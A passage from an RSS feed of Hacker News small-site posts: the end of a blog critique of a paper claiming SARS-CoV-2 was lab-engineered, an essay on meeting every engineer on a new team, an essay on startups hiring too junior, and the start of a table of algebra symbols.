   would be extremely evident” and they could have released accurate information.
</p><p>
<b>Comment:</b> 
   This is a good point. If true, it would tend to exculpate the Chinese researchers.
   But we already know many techniques they could have used. No one was claiming 
   that making the virus was impossible. 
</p><p>
<b>What is needed:</b> 
   Sending live animals to another country requires tons of paperwork. They would need
   Jax's sales records or government export records (which might be available via a
   FOIA request). 
</p><hr><p>
<b>Claim 3:</b> 
   The paper provides a flow chart for how the virus could have been constructed.
   “Two restriction sites are present at either end of the RBM [receptor-binding
   motif] of SARS-CoV-2, providing convenience for replacing the RBM within the spike 
   gene.”
</p><p>
<b>Comment:</b> 
   The spike protein consists of two parts: S1, which binds to the receptor, and S2,
   which fuses the viral and cellular membranes. The point where the subunits are joined 
   is called the S1/S2 site. Proteolysis of this site is essential for infection.
   The RBM is the part of S1 that binds to the receptor. A common technique is 
   to take functional domains out of one protein and put them into another. The easiest 
   way to do this is by finding (or creating) restriction sites in the DNA that allow 
   you to cut the DNA in a specific place.
</p><p>
   The flow chart is quite reasonable, but again no one doubted that artificially 
   creating the virus is possible. So describing how someone could have done it
   doesn't tell us much; any competent molecular biologist could come up with
   a similar scheme.
</p><p>
   The article makes a big deal about the presence of restriction sites on the S1/S2 
   sequence, including an <code>EcoRI</code> site and a <code>BstEII</code> site. 
   But this does not indicate engineering. Many restriction sites occur naturally by 
   chance. Their presence is not unusual, but they are a major inconvenience for those 
   of us who try to clone DNA—many restriction sites we might wish to use are 
   ruled out by the presence of another one in an inconvenient location. The 
   probability of finding one of over a thousand known 
   <a href="http://rebase.neb.com/rebase/rebase.html">restriction sites</a> at an 
   arbitrary location in a 3800 base sequence by chance is very high.
</p><p>
<b>What is needed:</b> 
   To prove this convincingly, the authors would need to find an authentic copy 
   of the original virus sequence without the restriction sites to show what the virus 
   was like before the supposed change was made. 
</p><hr><p>
<b>Claim 4:</b> 
   The furin cleavage site contains rare codons, an unusual sequence not shared by other 
   lineage B betacoronaviruses, and a <code>FauI</code> restriction site. It 
   could not have been introduced by evolution, say the authors, and the probability 
   of successful homologous recombination ever occurring among the ancestors of these 
   viruses is low. “A  <code>FauI</code> restriction site is formulated by the codon choices 
   here, suggesting the possibility that the restriction fragment length polymorphism,
   a technique that a WIV lab is proficient at, could have been involved.”
   The authors suggest that the <code>FauI</code> site was added to monitor the presence
   of the furin-cleavage site.
</p><p>
<b>Comment:</b> 
   The furin cleavage site is known to increase the tropism of the virus, and it is 
   now known that the virus even infects the brain, but there is little evidence so
   far that it increases pathogenicity. There is as yet no good explanation for the 
   presence of the furin cleavage site. 
</p><p>
   It might make sense for a virus creator to put a restriction site in the middle of
   the furin cleavage site to make sure it didn't disappear. RFLP analysis is a simple 
   technique and any molecular biology lab could handle it easily. However, as mentioned,
   restriction sites pop up randomly all the time, so finding one proves little.
</p><p>
<b>What is needed:</b> 
   The <code>FauI</code> restriction site is a red herring. To prove that the furin cleavage
   site was added, the authors would have to find a trail of evidence showing step
   by step how the sequence was manipulated from whatever virus the WIV started from.
   It would also be helpful to have data showing that furin cleavage increases 
   pathogenicity. This is plausible but it needs to be shown experimentally.
</p><hr><p>
<b>Claim 5:</b> 
   WIV most likely used ZC45 and ZXC21, not RaTG13, to create SARS-CoV-2 because RaTG13 is 
   not real. The reasoning behind this claim is that the S1 sequence of SARS-CoV-2 
   is quite similar to these other viruses except for the receptor-binding motif and 
   furin-cleavage sites. Also, two other proteins on these viruses, the Orf8 protein 
   and E protein, are 94.2% and 100% identical to SARS-CoV-2.
</p><p>
<b>Comment:</b> 
   This is indeed strange but so far circumstantial.
</p><p>
<b>What is needed:</b> 
   The authors need to prove that RaTG13 is not real. They claim to have evidence,
   and I look forward to seeing it,  but to be convincing it would have to be more 
   than the discovery of mysterious unexplained features in the DNA sequence.
</p><hr><p>
The authors say they plan to prove that RaTG13 is fabricated in a follow-up report. 
If they can do this, it would be solid evidence of consciousness of guilt on the part 
of WIV researchers. However, the current paper doesn't say very much more than what 
other bloggers have already revealed.
</p><p>
It would be premature to draw any conclusion about the origins of the virus from this
paper. The authors have set for themselves a difficult and possibly impossible task: 
finding a signature of intel­ligent design in a virus is much like what the 
creationists have been doing without success for years. 
</p><p>
But what is not premature is that social media giants deciding for us what is 
true and what is false may turn out to be as big a threat as the virus. It is unfair 
and unscientific to dismiss ideas that one doesn't want to hear as “conspiracy 
theories” as many people are doing. 
</p><hr><p>
1. Yan LM, Kang S, Guan J, Hu S (2020). Unusual Features of the SARS-CoV-2 
Genome Suggesting Sophisticated Laboratory Modification Rather Than Natural 
Evolution and Delineation of Its Probable Synthetic Route.
https://zenodo.org/record/4028830
</p><hr><p>
<i>
sep 16 2020, 6:52 pm (Updated Sep 20 2020)
</i>
</p>
</section>
</div></div>]]>
            </description>
            <link>https://www.randombio.com/ratg132.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24529261</guid>
            <pubDate>Sat, 19 Sep 2020 17:57:57 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Meeting everyone on a new team]]>
            </title>
            <description>
<![CDATA[
Score 194 | Comments 45 (<a href="https://news.ycombinator.com/item?id=24529176">thread link</a>) | @craigkerstiens
<br/>
September 19, 2020 | https://www.annashipman.co.uk/jfdi/meeting-everyone.html | <a href="https://web.archive.org/web/*/https://www.annashipman.co.uk/jfdi/meeting-everyone.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="meeting-everyone">
    
    <date>17 September 2020</date>
      <p>When I joined the Financial Times as Technical Director for FT.com, I inherited a team of around 50 engineers. One of the first things I did was meet each of them for a one-to-one. I was initially resistant, but it was extremely valuable, I’m glad I did it, and I would definitely do it again in a future role.</p>

<h2 id="my-mentors-advice-about-the-content-of-the-meeting">My mentor’s advice about the content of the meeting</h2>

<p>The idea was suggested to me by a mentor, who’d been advised to do it by <em>his</em> mentor, a Rear Admiral, who said this was something you should do whenever you have a team of fewer than 150 people. My mentor gave me some tips:</p>

<ul>
  <li>Be clear about whether you will take action or whether this is for information only.</li>
  <li>This should mostly be about listening – you should talk for maybe 5 minutes and they should talk for 25.</li>
  <li>It’s to find out what’s going well and what’s not going well.</li>
  <li>It’s informal, but make sure it’s in an enclosed meeting room so that people feel they can speak freely.</li>
  <li>Sometimes it will be quite boring, sometimes you may just learn a lot about someone’s family or hobbies, but that is useful from a getting to know people/relationship-building perspective and it means that you know some things about that person.</li>
  <li>Aim is to get a bit about their background, their priorities and their pressures.</li>
</ul>

<h2 id="making-time-was-hard">Making time was hard</h2>

<p>I was initially resistant because of the time commmitment. With a team of ~50, that’s a lot of hours, and I was also working four days a week so each meeting takes up a greater proportion of time. However, once I’d made the decision to do this and announced my intention, it was important to me to follow through, so I made sure to make time.</p>

<p>I scheduled four of these 1:1s a week, starting with the people reporting directly to me and then on down the management chain.</p>

<h2 id="i-ran-each-meeting-in-the-same-way">I ran each meeting in the same way</h2>

<p>Firstly I ran through everything I planned to cover, and then stepped through it.</p>


<ul>
  <li>I am asking the same questions to everyone</li>
  <li>This is information for me only to get an idea of themes and how things are going; I’m not explicitly planning to take action on anything we discuss, so if something comes up that I need to take action on, let’s make sure we discuss that after this meeting</li>
  <li>This is confidential. If you say something about someone else I’m not going to go and tell them. I may report on ‘what people are saying’, but I’ll say ‘the engineers feel’ or ‘an engineer said’; I won’t say “[Your name] said…”</li>
</ul>

<h3 id="what-were-going-to-discuss">What we’re going to discuss</h3>

<ul>
  <li>First I’ll introduce myself, and tell you a bit about my background</li>
  <li>Then, if you like, I’d love you to tell me a bit about yourself – as much or as little as you feel like sharing</li>
  <li>Then we’ll discuss the following questions:</li>
</ul>

<ol>
  <li>What do you think the most important things we should be doing over the next year?</li>
  <li>What will get in the way of us doing that?</li>
  <li>What’s going well, i.e. what should we make sure we don’t change?</li>
  <li>Is there anything you think I should know about?</li>
</ol>

<h2 id="is-there-anything-i-should-know-about">Is there anything I should know about?</h2>

<p>When I asked this question I talked a bit about why I was asking. I explained that I might not necessarily see or know things that may seem apparent to them, and while they should always feel able to bring things to me, now was a good opportunity to do so. It was an opportunity to make sure I’ve heard what’s important to you, what things should change and what things should stay the same.</p>

<p>This question always elicited very interesting responses, from organisational issues, to personal information people felt it was valuable for me to know about them.</p>

<h2 id="i-told-them-what-i-was-planning-to-ask-in-advance">I told them what I was planning to ask in advance</h2>

<p>I put all the information in the meeting invite.</p>

<div>
<p>I mentioned that I wanted to have a chat with everyone on FT.com to understand how things are going, does this time suit you for this?</p>

<p>The meeting agenda is the same for everyone; a quick intro and then the following questions (I'll go through this in the meeting too):</p>

<ul>
<li>What do you think the most important things we should be doing over the next year?</li>
<li>What will get in the way of us doing that?</li>
<li>What’s going well, i.e. what should we make sure we don’t change?</li>
<li>Is there anything you think I should know about?</li>
</ul>

<p>Thanks,</p>
<p>Anna</p>
</div>

<p>Some people did not read the meeting invite and came with no idea what the meeting was about. Some people had fully prepared and written notes that they then read out to me. Actually people having prepared sometimes was less useful, because sometimes it led the conversation to solutions rather than problems. However it was great that people had really given it some thought.</p>

<h2 id="making-notes-felt-too-much-like-a-promise">Making notes felt too much like a promise</h2>

<p>Each meeting was half an hour. In the very first one, I made notes in a notebook, but I realised that created an implicit commitment that I was going to take action on everything that was said, even though I had said it was information only.</p>

<p>However, I do not have a very good memory, so for all the subsequent ones I made a few notes after each meeting of key themes. This meant I couldn’t do more than two in a row or go straight into another meeting, so it made scheduling slightly harder. These days, people are much more aware of the shorter meeting approach so if doing this again, I’d go for the ‘therapy hour’ – 25 minutes for conversation then 5 minutes for me to make the notes.</p>

<h2 id="introducing-myself">Introducing myself</h2>

<p>In my intro, I gave a potted career history. Starting from my degree in philosophy, and my first career in <a href="https://www.barringtonstoke.co.uk/">children’s book publishing</a>, through teaching myself to code, my <a href="https://www.hw.ac.uk/study/uk/postgraduate/information-technology-software-systems.htm">masters in Software Systems</a> and then my 15+ year career in programming, infrastructure and operations, technical architecture, and my previous role as <a href="https://www.annashipman.co.uk/jfdi/a-year-in-the-life-os-lead.html">Open Source lead</a>. I also talked about what appealed to me about the job as Technical Director at the FT.</p>

<p>I said roughly the same thing to everyone. I don’t normally introduce myself and give my background, but in this case I thought that as a new Tech Director most of them would not be working closely with me, and I would not be contributing code, so it was worth giving my credentials.</p>

<p>My mentor had suggested I also say something personal. I think he intended something like “married with two children” (or whatever), but instead, I tried to give a different kind of personal detail, something about my interests. I tried to come up with a different one for each conversation, for example something about my <a href="https://twitter.com/annashipman/status/1043917006477643777">cross-stitch hobby</a>.</p>

<p>This part was the hardest part for me, because prior to this I had generally enjoyed keeping a clear boundary between work stuff and personal stuff, so that definitely didn’t cover talking about cross-stitch, or my home life, on a first meeting. However, I had been trying to bring more of my personal self to work, and this part of the intro did lead to some really interesting conversations and I think helped make a better connection.</p>

<p>Of course, these days, when we are all at home, my personal life is in meetings with me, so it’s good I’d already started on that journey!</p>

<p>Giving so much information in my introduction also allowed the other person to introduce themselves how they wanted. Some talked career history, some focused on their hobbies, others were really open about their lives and aspirations.</p>

<h2 id="i-am-so-glad-i-did-this">I am so glad I did this</h2>

<p>My mentor was wrong about one thing –&nbsp;none of the conversations were boring.</p>

<p>In my first few months in the new job, I often felt really stretched for time, but I never regretted a single one of these meetings; it was always extremely interesting, my team are brilliant and it was great to meet them one on one, and each conversation always contained some valuable information.</p>

<p>There were two very valuable things about this for me.</p>

<p>The first was getting an idea of what change was needed. These meetings gave me a brilliant insight that wasn’t available elsewhere. Patterns started emerging very quickly, and formed the basis of our <a href="https://medium.com/ft-product-technology/the-difficult-teenage-years-setting-tech-strategy-after-a-launch-7f42eb94a424">tech strategy</a>.</p>

<p>The second was building relationships. A lot of the people I had 1:1s with I would not have come into contact with during the course of the ordinary working week. It would have taken time to meet everyone at socials, and it wouldn’t have been the same quality of conversation. I still feel, two years on, that I know a bit about all the people I had those conversations with, which has felt to me like a good foundation for our subsequent conversations.</p>

<p>It was also good, as someone who is a bit shy, to have names to faces quite quickly and people to say hello to when walking round the office.</p>

<h2 id="was-it-useful-for-my-team">Was it useful for my team?</h2>

<p>About a year later, I asked some of the people with whom I’d had these conversations whether they’d been useful (in an anonymous form).</p>

<p>All of the people who responded said they found the conversation valuable, and some of their comments were:</p>

<ul>
  <li>“It broke down barriers and helped me feel less intimidated about approaching you, whether to talk about work or just to have a general chit chat. You are a very busy person who I wouldn’t ever work with directly so it was good to feel that you knew I existed.”</li>
  <li>“There is hardly any opportunity for me to talk to people in higher position like you except when the team has a big problem. The 1:1 was really casual and I felt really comfortable talking to you. It was a good time to know what kind of person you are. If we didn’t do the 1:1, the answer of the question below “Do you feel able to raise issues with me?” would be “No”.”</li>
  <li>“We sat down when you first started and it was nice to get some one-to-one time because it’s not often you get to do that with a Technical Director. It was nice to raise issues but for me, it was more of an opportunity to understand if I could trust you in the future with raising issues. Raising issues can be difficult and scary so it’s important to know if the person you are raising them to is receptive.”</li>
  <li>“It really showed that you cared about us as humans, and how we fit with the rest of the team. It was also a great opportunity to get to know you”</li>
  <li>“I think often of that conversation”</li>
</ul>

<h2 id="did-it-make-them-feel-more-able-to-raise-issues-with-me">Did it make them feel more able to raise issues with me?</h2>
</div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.annashipman.co.uk/jfdi/meeting-everyone.html">https://www.annashipman.co.uk/jfdi/meeting-everyone.html</a></em></p>]]>
            </description>
            <link>https://www.annashipman.co.uk/jfdi/meeting-everyone.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24529176</guid>
            <pubDate>Sat, 19 Sep 2020 17:45:39 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Reasons Your Growth Startup Is Hiring Too Junior]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24529137">thread link</a>) | @svmanager
<br/>
September 19, 2020 | https://staysaasy.com/management/2020/09/11/Hiring-Too-Junior.html | <a href="https://web.archive.org/web/*/https://staysaasy.com/management/2020/09/11/Hiring-Too-Junior.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p>Growth startups often find themselves lacking senior team members as they scale. The problems that arise from this are plentiful, including things like:</p>
<ul>
  <li>Requiring heroics to fix things</li>
  <li>Penalizing junior team members for failure to meet responsibilities well above their pay grade.</li>
  <li>Building technology that doesn’t scale</li>
</ul>

<p>Here’s some reasons why companies get into this situation.</p>

<h2 id="reason-1-habit">Reason 1: Habit</h2>

<p>When you’re a tiny startup budgets are extremely lean and products don’t have a lot of users. In that environment companies often prioritize breadth of functionality (see what works) and getting that via several (more affordable) junior team members guided by a smaller group of senior team members.</p>

<p>Problems arise if that strategy exists past market fit. The add-a-junior-to-do-more strategy implodes as the team grows too large for the senior staff to manage closely and the technical challenges start to look more daunting.</p>

<h2 id="reason-2-hubris">Reason 2: Hubris</h2>

<p>Sometimes people recognize the problems are getting more difficult but still don’t hire more seniors. This can often be chalked up to hubris - surely I can just direct a bunch of juniors to execute on the genius solutions I come up with for all our problems. The problem here is that you’re not a genius and even if you were that strategy doesn’t scale.</p>

<h2 id="reason-3-fear">Reason 3: Fear</h2>

<p>The flip side of hubris is fear. New senior staff can look like a threat to the power of existing senior staff. You might have to choose between doing what’s right for the company and retaining certain kinds of power. The answer there is simple - it’s better to be part of something great than the owner of something that fails.</p>

<p>A different play on this theme is junior teammates fearing that new senior teammates will take away some of their opportunities. It’s possible, sure. But more often the opportunities they will take over are the ones juniors would have had trouble succeeding in.</p>

<p>In a growing company with reasonably difficult challenges, good seniors will do more to expand the set of opportunities than shrink them. And good senior talent will help juniors via mentorship and guidance.</p>

<h2 id="reason-4-money-issues">Reason 4: Money Issues</h2>

<p>Money issues play out in a couple ways.</p>

<p>First, the cost of senior talent can subconsciously make you concerned about the remaining budget for yourself. I haven’t seen this played out directly and blatantly, but it’s another version of the fear game - assuming compensation is a zero sum game leads to weird incentives.</p>

<p>Second, it’s easy to think 2 juniors are better than one senior. As you read about the myth of the 10x engineer you might find yourself thinking this way. Let’s talk more about how this is a misconception in reason 5…</p>

<h2 id="reason-5-miscalculation-of-necessary-skills-for-right-now">Reason 5: Miscalculation of Necessary Skills For Right Now</h2>

<p>As referenced earlier, problems get much harder when you add significant growth to a platform. It’s not uncommon to underestimate the challenges at hand. In reality, even simple products at massive scale need significant senior leadership to ensure they are being built and operated effectively. Trying to replace the leadership of senior talent with a volume of junior talent is a sure-fire way to screw this up.</p>

<h2 id="reason-6-miscalculation-of-necessary-skills-in-the-future">Reason 6: Miscalculation of Necessary Skills In the Future</h2>

<p>To make things more difficult, you don’t just have to hire for right now, you have to hire for 2 or more years in the future. The senior talent you hire now must seed the leadership ranks you need in the future. Especially in product and engineering, you can’t just hire everyone you need when you need them. For starters, the job market would laugh at that sort of just-in-time attempt at hiring. But also, these roles require much more detailed understanding of the systems at play, so you need to have people with intimate knowledge developed in advance.</p>

<p>Think of it this way - look at whatever company you’re trying to be like in 5 years. Look at their team. If you don’t start hiring towards something like that team sooner rather than later you’ll never be that company.</p>

<h2 id="reason-7-arguments-about-what-seniors-need">Reason 7: Arguments About What-Seniors-Need</h2>

<p>Another reason people hire too junior is thinking around senior talent needing explicit areas of responsibility that don’t overlap. This is the “one alpha” theory - that senior talent can’t collaborate productively and need their own pack. There might be some nuggets of truth here, but most of it is nonsense. That’s like NASA saying they couldn’t have smart people work together on getting to the moon because these great scientists need their own domains.</p>

<p>Ultimately you have to look at the problems you’re solving. If they are truly challenging they can support a number of seniors. If they aren’t you’ll probably have trouble hiring and retaining more than a few.</p>

<h2 id="conclusion">Conclusion</h2>

<p>There’s a lot of reasons why you might hire too junior as your company grows. Know them and hire intentionally.</p>


    




  </div></div>]]>
            </description>
            <link>https://staysaasy.com/management/2020/09/11/Hiring-Too-Junior.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24529137</guid>
            <pubDate>Sat, 19 Sep 2020 17:39:50 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Notations and concepts in basic, linear and abstract algebra]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24528969">thread link</a>) | @R3G1R
<br/>
September 19, 2020 | https://mathvault.ca/hub/higher-math/math-symbols/algebra-symbols/ | <a href="https://web.archive.org/web/*/https://mathvault.ca/hub/higher-math/math-symbols/algebra-symbols/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content"><div><div id="theme-content-section"><div><section data-css="tve-u-16ec5d248bb"><p><span>A</span>lgebra is a subfield of mathematics pertaining to the manipulation of symbols and their governing rules. The following is a compilation of <strong>symbols</strong> from the different branches of algebra, which include basic algebra, number theory, linear algebra and abstract algebra.</p><p>For readability purpose, these symbols are categorized by their function and topic into <strong>charts</strong> and <strong>tables</strong>. Other comprehensive lists of symbols — as categorized by subject&nbsp;and type — can be also found in the relevant pages below (or in the navigational panel).</p><div><div><div><figure><img loading="lazy" width="400" height="518" src="https://mathvault.ca/wp-content/uploads/Math-Symbols-eBook-Cover.png" alt="Cover of Math Vault's Comprehensive List of Mathematical Symbols eBook" title="Math Symbols eBook Cover"></figure><div><p>Prefer the PDF version instead?</p><p>Get the master summary of mathematical symbols in <strong>eBook form</strong> — along with each symbol’s usage and LaTeX code.</p></div></div></div></div><h2><span id="Constants"></span>Constants<span></span></h2><p>In algebra, <strong>constants</strong> are symbols used to denote key mathematical elements and sets. The following tables document the most common of these — along with each symbol’s name, usage and example.</p><p>(For common constants in general, see <a href="https://mathvault.ca/hub/higher-math/math-symbols/common-math-symbols/#Mathematical_Constants" target="_blank" rel="noopener noreferrer">common math constants</a>.)</p><h3><span id="Key_Mathematical_Elements"></span>Key Mathematical Elements<span></span></h3><figure><table><thead><tr><th>Symbol Name</th><th>Explanation</th><th>Example</th></tr></thead><tbody><tr><td>$i$</td><td><a rel="noreferrer noopener" href="https://en.wikipedia.org/wiki/Imaginary_unit" target="_blank"><strong>Imaginary unit</strong></a></td><td>$i^2 + 1 = 0$</td></tr><tr><td>$\mathbf{0}$, $\vec{0}$</td><td><strong><a href="https://en.wikipedia.org/wiki/Zero_element#Additive_identities" target="_blank" aria-label="Zero vector (opens in a new tab)" rel="noreferrer noopener">Zero vector</a></strong></td><td>$\mathbf{0} \ne 0$</td></tr><tr><td>$O$</td><td><strong><a href="https://en.wikipedia.org/wiki/Zero_matrix" target="_blank" aria-label="Zero matrix (opens in a new tab)" rel="noreferrer noopener">Zero matrix</a></strong></td><td>$O_{2 \times 3} = \\ \begin{pmatrix} 0 &amp; 0 &amp; 0 \\ 0 &amp; 0 &amp; 0 \end{pmatrix}$</td></tr><tr><td>$I$</td><td><strong><a aria-label="$n$-dimensional identity matrix (opens in a new tab)" rel="noreferrer noopener" href="https://en.wikipedia.org/wiki/Identity_matrix" target="_blank">Identity matrix</a></strong></td><td>$I_2 = \begin{pmatrix} 1 &amp; 0 \\ 0 &amp; 1 \end{pmatrix}$</td></tr><tr><td>$e$</td><td><a href="https://en.wikipedia.org/wiki/Identity_element" target="_blank" aria-label="Identity element of a group (opens in a new tab)" rel="noreferrer noopener"><strong>Identity element of a group</strong></a></td><td>For all $g \in G$, $g \circ e = e \circ g = g$.</td></tr></tbody></table></figure><h3><span id="Key_Mathematical_Sets"></span>Key Mathematical Sets<span></span></h3><p>In algebra, certain sets of numbers (or other more elaborated objects) tend to occur more frequently than others. These sets are often denoted by some variants of <strong>alphabetical letters</strong>&nbsp;— many of which are of the <a href="https://mathvault.ca/hub/higher-math/math-symbols/greek-hebrew-latin-symbols/#Latin-based_Alphabets" target="_blank" rel="noopener noreferrer">blackboard bold</a> typeface.</p><figure><table><thead><tr><th>Symbol Name</th><th>Explanation</th><th>Example</th></tr></thead><tbody><tr><td>$\mathbb{P}$</td><td>Set of <strong>prime numbers</strong></td><td>$127 \in \mathbb{P}$</td></tr><tr><td>$\mathbb{N}_0$</td><td>Set of <strong>natural numbers</strong> <br>(starting with $0$)</td><td>$0 \in \mathbb{N}_0$</td></tr><tr><td>$\mathbb{N}_1$</td><td>Set of <strong>natural numbers</strong><br>(starting with $1$)</td><td>$0 \notin \mathbb{N}_1$</td></tr><tr><td>$\mathbb{Z}$</td><td>Set of <strong>integers</strong></td><td>For all $x, y \in \mathbb{N}$, $x-y \in \mathbb{Z}$.</td></tr><tr><td>$\mathbb{Z}_+$</td><td>Set of <strong>positive integers</strong></td><td>$\mathbb{Z}_+ = \mathbb{N}_1$</td></tr><tr><td>$\mathbb{Q}$</td><td>Set of <strong>rational numbers</strong></td><td>$3.\overline{73} \in \mathbb{Q}$</td></tr><tr><td>$\mathbb{Q}_p$</td><td>Set of <strong><a href="https://en.wikipedia.org/wiki/P-adic_number#Introduction" target="_blank" aria-label="p-adic numbers (opens in a new tab)" rel="noreferrer noopener">p-adic numbers</a></strong></td><td>In $\mathbb{Q}_{10}$, $-1 = …999$ (as $1 +  …999  = 0$).</td></tr><tr><td>$\mathbb{A}$</td><td>Set of <strong><a aria-label="algebraic numbers (opens in a new tab)" rel="noreferrer noopener" href="https://en.wikipedia.org/wiki/Algebraic_number" target="_blank">algebraic numbers</a></strong></td><td>$\sqrt{5} + 3 \in \mathbb{A}$</td></tr><tr><td>$\mathbb{R}$</td><td>Set of <strong><a href="https://en.wikipedia.org/wiki/Real_number" target="_blank" aria-label="real numbers (opens in a new tab)" rel="noreferrer noopener">real numbers</a></strong></td><td>$i \notin \mathbb{R}$</td></tr><tr><td>$\mathbb{R}_+$</td><td>Set of <strong><a href="https://en.wikipedia.org/wiki/Positive_real_numbers" target="_blank" aria-label="positive real numbers (opens in a new tab)" rel="noreferrer noopener">positive real numbers</a></strong></td><td>For all $x, y \in \mathbb{R}_+$, $xy \in \mathbb{R}_+$.</td></tr><tr><td>$\mathbb{R}_-$</td><td>Set of <strong><a href="https://en.wikipedia.org/wiki/Real_number#Vocabulary_and_notation" target="_blank" aria-label="negative real numbers (opens in a new tab)" rel="noreferrer noopener">negative real numbers</a></strong></td><td>If $a, b \in \mathbb{R}_-$, then $a+b \in \mathbb{R}_-$.</td></tr><tr><td>$\mathbb{R}-\mathbb{Q}$</td><td>Set of <strong><a href="https://en.wikipedia.org/wiki/Irrational_number" target="_blank" aria-label="irrational numbers (opens in a new tab)" rel="noreferrer noopener">irrational numbers</a></strong></td><td>$\log 2 \in \mathbb{R}-\mathbb{Q}$</td></tr><tr><td>$\mathbb{I}$</td><td>Set of <strong><a href="https://en.wikipedia.org/wiki/Imaginary_number" target="_blank" aria-label="imaginary numbers (opens in a new tab)" rel="noreferrer noopener">imaginary numbers</a></strong></td><td>$5i \in \mathbb{I}, 2+3i \notin \mathbb{I}$</td></tr><tr><td>$\mathbb{C}$</td><td>Set of <strong><a href="https://en.wikipedia.org/wiki/Complex_number" target="_blank" aria-label="complex numbers (opens in a new tab)" rel="noreferrer noopener">complex numbers</a></strong></td><td>There exists a number $x \in \mathbb{C}$ such that $x^2 + 2x + 3 = 0$.</td></tr><tr><td>$\mathbb{H}$</td><td>Set of <strong><a href="https://en.wikipedia.org/wiki/Quaternion" target="_blank" aria-label="quaternions (opens in a new tab)" rel="noreferrer noopener">quaternions</a></strong></td><td>$5+6i-2j+3k \in \mathbb{H}$</td></tr><tr><td>$\mathbb{O}$</td><td>Set of <strong><a href="https://en.wikipedia.org/wiki/Octonion" target="_blank" aria-label="octonions (opens in a new tab)" rel="noreferrer noopener">octonions</a></strong></td><td>$e_0 + \cdots + e_7 \in \mathbb{O}$</td></tr><tr><td>$\mathbb{R}^n$</td><td>N-dimensional <strong><a href="https://en.wikipedia.org/wiki/Euclidean_space" target="_blank" aria-label="Euclidean space (opens in a new tab)" rel="noreferrer noopener">Euclidean space</a></strong></td><td>$\mathbf{i}, \mathbf{j}, \mathbf{k} \in \mathbb{R}^3$</td></tr><tr><td>$B_r(p)$</td><td><strong><a aria-label="Ball (opens in a new tab)" href="https://en.wikipedia.org/wiki/Ball_(mathematics)#In_general_metric_spaces" target="_blank" rel="noreferrer noopener">Open ball</a></strong> of radius $r$ around point $p$</td><td>$(0.5, 0.8, 0.4) \notin$<br>$B_1(0)$</td></tr><tr><td>$\mathbb{Z}_n$</td><td>Set of <strong><a href="https://en.wikipedia.org/wiki/Modular_arithmetic#Integers_modulo_n" target="_blank" aria-label="integers modulo $n$ (opens in a new tab)" rel="noreferrer noopener">integers modulo $n$</a></strong></td><td>$[24] = [11] \in \mathbb{Z}_{13}$</td></tr><tr><td>$R^{m \times n}$</td><td>Set of <strong><a aria-label="$m \times n$ matrices (opens in a new tab)" href="https://en.wikipedia.org/wiki/Matrix_(mathematics)#Notation" target="_blank" rel="noreferrer noopener">$m \times n$ matrices</a></strong> with entries from ring $R$</td><td>$\begin{pmatrix} 2 &amp; 3 \\ 1 &amp; 4 \end{pmatrix} \in \mathbb{R}^{2 \times 2}$</td></tr><tr><td>$GL_n(R)$</td><td>Group of <strong><a href="https://en.wikipedia.org/wiki/General_linear_group" target="_blank" aria-label="$n \times n$ invertible matrices (opens in a new tab)" rel="noreferrer noopener">$n \times n$ invertible matrices</a></strong> with entries from ring $R$</td><td>$\begin{pmatrix} 1 &amp; 0 \\ 2 &amp; 0 \end{pmatrix} \notin GL_2(\mathbb{R})$</td></tr><tr><td>$S_n$</td><td><strong><a href="https://en.wikipedia.org/wiki/Symmetric_group" target="_blank" aria-label="Symmetric group (opens in a new tab)" rel="noreferrer noopener">Symmetric group</a></strong> on a set of $n$ elements</td><td>$|S_n| = n!$</td></tr><tr><td>$R^{\times}$</td><td><strong><a href="https://en.wikipedia.org/wiki/Unit_(ring_theory)#Group_of_units" target="_blank" aria-label="Group of units (opens in a new tab)" rel="noreferrer noopener">Group of units</a></strong> of ring $R$</td><td>$x \in \mathbb{Z}^{\times}$ if $x \in \mathbb{Z}$ and $\exists y \in \mathbb{Z}$ such that $xy = yx = 1$.</td></tr><tr><td>$R[x]$</td><td><strong><a href="https://en.wikipedia.org/wiki/Polynomial_ring" target="_blank" aria-label=" (opens in a new tab)" rel="noreferrer noopener">Polynomial ring</a></strong> with coefficients from ring $R$</td><td>$-3x^3 + x^2 + 2x +1$<br>$\in \mathbb{Z}[x]$</td></tr></tbody></table></figure><h2><span id="Variables"></span>Variables<span></span></h2><p>Since algebra is concerned with the manipulation of mathematical symbols, it often draws upon a wide range of <strong>variables</strong> as placeholders for varying objects and quantities. The following table documents the most common of these — along with their respective usage and example.</p><figure><table><thead><tr><th>Symbol Name</th><th>Used For</th><th>Example</th></tr></thead><tbody><tr><td>$m, n, p, q$</td><td><strong>Natural numbers</strong> and <strong>integers</strong></td><td>$m+n-2p = q$</td></tr><tr><td>$a, b, c$</td><td><strong>Coefficients</strong> of functions and equations</td><td>A linear equation has the general form $ax+by+c = 0$.</td></tr><tr><td>$x, y, z$</td><td><strong>Unknowns</strong> in functions and equations</td><td>If $14x + 2y = 4$, then $y = 2-7x$.</td></tr><tr><td>$\Delta$</td><td><strong><a href="https://en.wikipedia.org/wiki/Discriminant" target="_blank" aria-label="Discriminant (opens in a new tab)" rel="noreferrer noopener">Discriminant</a></strong></td><td>For <a aria-label="quadratic polynomials (opens in a new tab)" rel="noreferrer noopener" href="https://mathvault.ca/quadratic-factorisation/#The_General_Method_Theory" target="_blank">quadratic polynomials</a>, $\Delta = b^2 – 4ac$.</td></tr><tr><td>$i, j, k$</td><td><strong>Index variables</strong></td><td>$\displaystyle \prod_{(i,j)=(1,1)}^{(3,5)} \frac{i + j}{2}$</td></tr><tr><td>$z$</td><td><strong><a href="https://en.wikipedia.org/wiki/Complex_number" target="_blank" aria-label="Complex numbers (opens in a new tab)" rel="noreferrer noopener">Complex numbers</a></strong></td><td>$ |z_1 z_2| = |z_1| 